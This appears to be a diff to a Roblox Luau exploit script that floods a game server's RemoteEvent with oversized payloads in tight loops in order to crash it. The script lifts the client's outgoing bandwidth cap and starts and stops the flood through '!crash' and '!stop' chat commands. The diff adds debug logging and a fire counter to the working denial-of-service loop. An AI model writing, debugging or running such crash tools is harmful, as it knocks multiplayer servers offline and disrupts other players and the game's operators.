@@ -5,7 +5,7 @@ local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 
--- ═══════════ EXACT SAME VALUES ═══════════
+-- ═══════════ EXACT SAME VALUES AS ORIGINAL ═══════════
 local Children       = 150000
 local NestedPerChild = 0
 local FieldsPerChild = 0
@@ -20,6 +20,7 @@ local state = {
     remote  = nil,
     cache   = nil,
     pad     = "",
+    fires   = 0,
 }
 
 local function resolve()
@@ -33,6 +34,7 @@ local function resolve()
 end
 
 state.remote = resolve()
+print("[CRASH] remote on load:", state.remote and state.remote:GetFullName() or "NOT FOUND")
 
 pcall(function()
     game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
@@ -70,15 +72,21 @@ local function fire()
     for _ = 1, FireBurst do
         state.remote:FireServer(payload)
     end
+    state.fires = state.fires + 1
 end
 
 local function start()
     if state.running then return end
     state.running = true
     state.cache = nil
+    state.fires = 0
+    print("[CRASH] STARTING — building payload...")
     state.thread = task.spawn(function()
         while state.running do
-            pcall(fire)
+            local ok, err = pcall(fire)
+            if not ok then
+                print("[CRASH] fire error:", err)
+            end
             if FrameDelay > 0 then
                 task.wait(FrameDelay)
             else
@@ -89,28 +97,45 @@ local function start()
 end
 
 local function stop()
+    if not state.running then return end
     state.running = false
     if state.thread then pcall(task.cancel, state.thread) end
     state.thread = nil
     state.cache = nil
+    print("[CRASH] STOPPED — total fires:", state.fires)
 end
+
+-- ═══════════ DEBUG PRINT EVERY 5s ═══════════
+task.spawn(function()
+    local last = 0
+    while true do
+        task.wait(5)
+        if state.running then
+            print(string.format("[CRASH] fires=%d (+%d/5s) remote=%s",
+                state.fires, state.fires - last,
+                state.remote and "ok" or "MISSING"))
+            last = state.fires
+        else
+            last = 0
+        end
+    end
+end)
 
 -- ═══════════ CHAT COMMANDS ═══════════
 local started = false
 
 local function onMessage(msg)
     local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
+    print("[CRASH] chat received:", m)
     if m == "!crash" then
         if not started then
             started = true
             pcall(start)
-            print("[CRASH] started")
         end
     elseif m == "!stop" then
         if started then
             started = false
             pcall(stop)
-            print("[CRASH] stopped")
         end
     end
 end
@@ -123,3 +148,5 @@ pcall(function()
         onMessage(message.Text)
     end)
 end)
+
+print("[CRASH] ready — type !crash in chat")
